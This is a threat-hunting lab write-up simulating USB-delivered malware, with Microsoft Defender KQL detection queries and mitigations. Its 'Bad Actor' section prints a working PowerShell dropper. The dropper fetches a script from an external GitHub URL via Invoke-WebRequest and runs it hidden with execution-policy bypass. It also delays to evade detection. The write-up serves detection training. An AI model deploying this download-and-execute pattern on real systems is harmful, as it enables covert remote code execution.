# Threat Event (USB Malware Execution via PowerShell)

**USB Device Triggers Malicious PowerShell Invoke-WebRequest Payload**

---

## Pre-steps:

I. **Created PowerShell simulation scripts to mimic malware behavior:**

* [`usb-mount.ps1`](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/usb-mount.ps1) – Simulates USB device insertion by mounting `E:\Payload`.
* [`malicious-usb-launcher.ps1`](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/malicious-usb-launcher.ps1) – PowerShell-based dropper that retrieves and executes a payload.
* [`fake-malware.ps1`](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/fake-malware.ps1) – Simulated second-stage malware payload.
* [`usb-unmount.ps1`](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/usb-unmount.ps1) – Simulates USB removal by unmounting the payload drive.
* [`master-usb-malware-sim.ps1`](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/master-usb-malware-sim.ps1) – Master script that automates the full simulation (mount → drop → execute → cleanup → unmount).

II. **Prepared the simulation environment:**

* Used `usb-mount.ps1` to mount a virtual USB payload directory (`E:\Payload`).
* Dropped `malicious-usb-launcher.ps1` into the mounted USB folder.
* Verified all scripts were staged for execution.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:

1. **Executed the attack simulation using `master-usb-malware-sim.ps1`:**

   * Orchestrated USB mount, launcher execution, cleanup, and unmount operations.

2. **The malicious launcher (`malicious-usb-launcher.ps1`) performed the following actions:**

```powershell
<#
.SYNOPSIS
    Simulates USB-delivered malware using PowerShell.
.DESCRIPTION
    Downloads a fake payload from an external source, waits to mimic stealth, then executes it.
#>

Write-Output "[*] USB device connected. Initializing..."
Start-Sleep -Seconds 5

Write-Output "[*] Downloading external payload to disk..."
Start-Sleep -Seconds 3
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jason-p-nguyen/malware-sim/main/fake-malware.ps1" -OutFile "C:\Temp\payload.ps1"
Write-Output "[+] Payload saved to C:\Temp\payload.ps1"

Write-Output "[*] Waiting to avoid immediate detection..."
Start-Sleep -Seconds 10

Write-Output "[*] Executing payload using PowerShell..."
Start-Sleep -Seconds 2
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Temp\payload.ps1"

Write-Output "[+] Payload launched. Continuing background operations..."
Start-Sleep -Seconds 5

Write-Output "[*] Cleaning up launcher evidence (simulated)..."
Start-Sleep -Seconds 2
# (Optional) Remove-Item -Path $MyInvocation.MyCommand.Path -Force

Write-Output "[✓] Simulation complete. USB payload execution mimicked."
```

3. **Payload (`fake-malware.ps1`) executed silently**, simulating second-stage activity such as command-and-control or system reconnaissance.

4. **Cleanup actions executed automatically**:

   * Deleted local artifacts (simulated).
   * Unmounted USB using `usb-unmount.ps1`.

---

## Tables Used to Detect IoCs:

| **Parameter**        | **Description**                                                                                                                                                          |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **DeviceFileEvents** | [Docs](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table) — Detect creation/deletion of `.ps1` files from USB or temporary folders. |

\| **DeviceProcessEvents** | [Docs](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table) — Detect suspicious PowerShell execution, including bypass flags or file launches. |

\| **DeviceNetworkEvents** | [Docs](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table) — Detect outbound connections using PowerShell (e.g., to GitHub or remote command sources). |

---

## Related Queries:

```kql
// Detect PowerShell script execution
DeviceProcessEvents
| where DeviceName == "fin-w10-wks-8"
| where AccountName == "jnguyen.admin"
| order by Timestamp desc
| project Timestamp, DeviceName, Account = AccountName, FileName, FolderPath, ProcessCommandLine

// Detect file creation or deletion in TEMP or USB paths
DeviceFileEvents
| where DeviceName == "fin-w10-wks-8"
| where InitiatingProcessAccountName == "jnguyen.admin"
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, Account = InitiatingProcessAccountName, InitiatingProcessCommandLine

// Detect outbound web requests from PowerShell
DeviceNetworkEvents
| where DeviceName == "fin-w10-wks-8"
| where InitiatingProcessAccountName == "jnguyen.admin"
| order by Timestamp desc
| project Timestamp, DeviceName, Account = InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
```

---

## Created By:

* **Author Name**: Jason Nguyen
* **Author Contact**: [https://github.com/jason-p-nguyen](https://github.com/jason-p-nguyen)
* **Date**: July 3, 2025

---

## Additional Notes:

* USB-based attacks remain a common method for **initial access**, especially in **physical breach** or **red team** scenarios.
* PowerShell is often used due to its native capabilities, making it harder to detect if script logging is not enforced.
* Suggested mitigations:

  * Disable `Invoke-WebRequest`, `IEX`, and unsanctioned PowerShell use.
  * Use device control tools to restrict USB usage.
  * Apply `AllSigned` execution policies.
  * Monitor for anomalous script behavior and USB mount events.

---

## Revision History:

| **Version** | **Changes**                          | **Date**     | **Modified By** |
| ----------- | ------------------------------------ | ------------ | --------------- |
| 1.0         | Initial draft                        | July 3, 2025 | Jason Nguyen    |
| 1.1         | Refactored flow, added master script | July 3, 2025 | Jason Nguyen    |

